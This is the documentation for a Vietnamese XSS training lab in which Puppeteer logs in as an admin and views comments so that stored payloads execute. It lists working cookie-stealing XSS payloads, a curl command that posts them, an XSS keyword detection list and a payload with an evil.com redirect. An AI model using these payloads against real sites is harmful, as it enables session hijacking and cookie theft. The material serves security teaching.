# 🌐 Chrome Auto-Login Feature - Hướng Dẫn Sử Dụng

## Tổng Quan

**Chrome Auto-Login** là tính năng mới cho phép server **tự động mở Chrome browser** và **đăng nhập admin** khi phát hiện XSS payload trong comment. Đây là cải tiến lớn từ việc chỉ giả lập HTTP request sang **thực sự execute JavaScript** trong browser context.

## 🚀 Cách Hoạt Động

### Workflow Mới

```
1. User post comment với XSS payload
2. Server phát hiện XSS patterns
3. ⏰ Đợi 3 giây
4. 🌐 Tự động mở Chrome browser
5. 🔐 Đăng nhập admin (admin/admin123)
6. 👀 Xem comments page
7. 🎯 XSS payload thực sự execute
8. 🚨 Cookie bị đánh cắp
9. 📸 Chụp screenshot
10. 🔒 Đóng browser sau 5 giây
```

### XSS Detection Patterns

Server sẽ phát hiện XSS payload khi comment chứa:

-   `<script` → Script injection
-   `<img` → Image-based XSS
-   `<svg` → SVG-based XSS
-   `onerror` → Event handler XSS
-   `javascript:` → JavaScript protocol

## 🛠️ Cài Đặt

### 1. Dependencies

```bash
npm install puppeteer
```

### 2. Files Mới

-   `browser-automation.js` - Module quản lý Chrome automation
-   `CHROME-AUTO-GUIDE.md` - Tài liệu hướng dẫn

### 3. Server Configuration

Server tự động:

-   Khởi tạo BrowserAutomation instance
-   Graceful shutdown khi dừng server
-   Error handling cho browser operations

## 🧪 Demo

### Bước 1: Khởi động Server

```bash
npm start
```

**Console Output:**

```
Server đang chạy tại http://localhost:3000
🚀 Chrome Auto-Login feature đã sẵn sàng!
```

### Bước 2: Login và Post XSS

```bash
# Login as attacker
curl -X POST http://localhost:3000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"user1","password":"password1"}'

# Post XSS payload
curl -X POST http://localhost:3000/api/comment \
  -H "Content-Type: application/json" \
  -H "Cookie: auth=user1:password1" \
  -d '{"comment":"<script>fetch(\"/api/steal?cookie=\"+document.cookie)</script>"}'
```

### Bước 3: Xem Magic! ✨

**Server Console:**

```
🚀 [CHROME-AUTO] Phát hiện comment mới, chuẩn bị mở Chrome...
🎯 [CHROME-AUTO] XSS payload detected! Sẽ mở Chrome sau 3 giây...
🌐 [CHROME-AUTO] Đang mở Chrome browser...
🚀 [CHROME-AUTO] Đang khởi động Chrome browser...
✅ [CHROME-AUTO] Chrome browser đã sẵn sàng
🔐 [CHROME-AUTO] Đang đăng nhập admin...
✅ [CHROME-AUTO] Admin đã đăng nhập thành công
👀 [CHROME-AUTO] Admin đang xem comments...
🎯 [CHROME-AUTO] XSS payload đã được trigger (nếu có)
✅ [CHROME-AUTO] Chrome automation hoàn thành!
📸 [CHROME-AUTO] Screenshot saved: xss-attack-1697451234567.png
🔒 [CHROME-AUTO] Browser đã đóng
```

**Browser sẽ:**

1. ✅ Tự động mở Chrome
2. ✅ Navigate đến `/lab/auth`
3. ✅ Điền username: `admin`, password: `admin123`
4. ✅ Click đăng nhập
5. ✅ Xem comments page
6. ✅ XSS payload execute thật
7. ✅ Cookie bị gửi đến `/api/steal`
8. ✅ Screenshot được lưu
9. ✅ Browser tự đóng sau 5 giây

## 📊 So Sánh: Cũ vs Mới

### ❌ Auto-Test Cũ (HTTP Simulation)

```
1. Post XSS comment
2. HTTP request giả lập admin
3. Detect XSS trong HTML response
4. Manually call /api/steal
5. Log stolen cookie
```

**Hạn chế:**

-   Không thực sự execute JavaScript
-   Chỉ simulate behavior
-   Không thấy browser thật

### ✅ Chrome Auto-Login Mới (Real Browser)

```
1. Post XSS comment
2. Mở Chrome browser thật
3. Đăng nhập admin thật
4. Xem page thật
5. JavaScript execute thật
6. Cookie bị đánh cắp thật
7. Screenshot thật
```

**Ưu điểm:**

-   ✅ JavaScript execute thật trong browser
-   ✅ Thấy được quá trình attack
-   ✅ Screenshot để debug
-   ✅ Real-world simulation
-   ✅ Educational value cao

## 🎯 XSS Payloads Test

### 1. Basic XSS

```html
<script>
    alert("XSS");
</script>
```

### 2. Cookie Stealing

```html
<script>
    fetch("/api/steal?cookie=" + document.cookie);
</script>
```

### 3. Image-based XSS

```html
<img src="x" onerror="fetch('/api/steal?cookie='+document.cookie)" />
```

### 4. SVG XSS

```html
<svg onload="fetch('/api/steal?cookie='+document.cookie)" />
```

## 🔧 Configuration

### Browser Settings

File: `browser-automation.js`

```javascript
this.browser = await puppeteer.launch({
    headless: false, // Hiển thị browser
    defaultViewport: { width: 1280, height: 720 },
    args: [
        "--no-sandbox",
        "--disable-setuid-sandbox",
        // ... more args
    ],
});
```

### Timing Settings

File: `server.js`

```javascript
// Delay trước khi mở Chrome (3 giây)
setTimeout(async () => { ... }, 3000);

// Thời gian giữ browser mở (5 giây)
setTimeout(async () => {
    await browserAutomation.close();
}, 5000);
```

### Customize Delay

```javascript
// Đổi thành 2 giây
setTimeout(async () => { ... }, 2000);

// Đổi thành 10 giây
setTimeout(async () => { ... }, 10000);
```

## 🛡️ Security Features

### 1. XSS Pattern Detection

```javascript
const hasXSSPayload =
    comment.includes("<script") ||
    comment.includes("<img") ||
    comment.includes("<svg") ||
    comment.includes("onerror") ||
    comment.includes("javascript:");
```

### 2. Error Handling

-   Browser initialization errors
-   Login failures
-   Navigation timeouts
-   Screenshot failures
-   Graceful shutdown

### 3. Resource Management

-   Auto-close browser after 5 seconds
-   Graceful shutdown on server stop
-   Memory cleanup
-   Process management

## 📸 Screenshots

Screenshots được tự động lưu với tên:

```
xss-attack-{timestamp}.png
```

**Ví dụ:**

-   `xss-attack-1697451234567.png`
-   `xss-attack-1697451234568.png`

## 🐛 Troubleshooting

### 1. Chrome không mở được

**Lỗi:** `Failed to launch the browser process`

**Giải pháp:**

```bash
# Cài đặt Chrome dependencies
sudo apt-get update
sudo apt-get install -y wget gnupg
wget -q -O - https://dl.google.com/linux/linux_signing_key.pub | sudo apt-key add -
sudo sh -c 'echo "deb [arch=amd64] http://dl.google.com/linux/chrome/deb/ stable main" >> /etc/apt/sources.list.d/google-chrome.list'
sudo apt-get update
sudo apt-get install -y google-chrome-stable
```

### 2. Permission denied

**Lỗi:** `Permission denied`

**Giải pháp:**

```bash
# Thêm user vào group để access /dev/shm
sudo usermod -a -G audio,video $USER
```

### 3. Timeout errors

**Lỗi:** `Navigation timeout`

**Giải pháp:**

```javascript
// Tăng timeout trong browser-automation.js
await this.page.goto(`${baseUrl}/lab/auth`, {
    waitUntil: "networkidle2",
    timeout: 15000, // Tăng từ 10s lên 15s
});
```

### 4. Browser không đóng

**Lỗi:** Browser vẫn mở sau khi server dừng

**Giải pháp:**

```bash
# Kill Chrome processes manually
pkill -f chrome
pkill -f chromium
```

## 🎓 Educational Value

### 1. Real Attack Simulation

-   Thấy được quá trình attack thật
-   JavaScript execute trong browser context
-   Real cookie stealing
-   Visual feedback

### 2. Debug Capabilities

-   Screenshots để analyze
-   Console logs
-   Network requests
-   DOM manipulation

### 3. Security Awareness

-   Hiểu rõ XSS impact
-   Thấy được session hijacking
-   Learn prevention methods
-   Real-world scenarios

## ⚠️ Security Notes

**CHỈ SỬ DỤNG TRONG LAB/EDUCATION!**

-   ❌ KHÔNG deploy production
-   ❌ KHÔNG dùng cho real applications
-   ✅ Chỉ dùng để học và demo security vulnerabilities
-   ✅ Isolated environment only

## 🚀 Future Enhancements

### 1. Multiple Browser Support

```javascript
// Firefox, Safari, Edge support
const browsers = ["chrome", "firefox", "safari"];
```

### 2. Advanced XSS Detection

```javascript
// Regex patterns cho obfuscated XSS
const xssPatterns = [
    /<script[^>]*>/i,
    /javascript:/i,
    /on\w+\s*=/i,
    /<iframe[^>]*>/i,
];
```

### 3. Custom Payloads

```javascript
// User-defined XSS payloads
const customPayloads = [
    'fetch("/api/steal?cookie="+document.cookie)',
    'document.location="http://evil.com"',
    'eval(atob("YWxlcnQoMSk="))',
];
```

---

**Version:** 1.4.0  
**Date:** 2025-01-16  
**Features:**

-   🌐 Chrome Auto-Login khi phát hiện XSS
-   🔐 Tự động đăng nhập admin
-   📸 Screenshot tự động
-   🛡️ Error handling và graceful shutdown
-   🎯 Real JavaScript execution
-   📚 Educational documentation
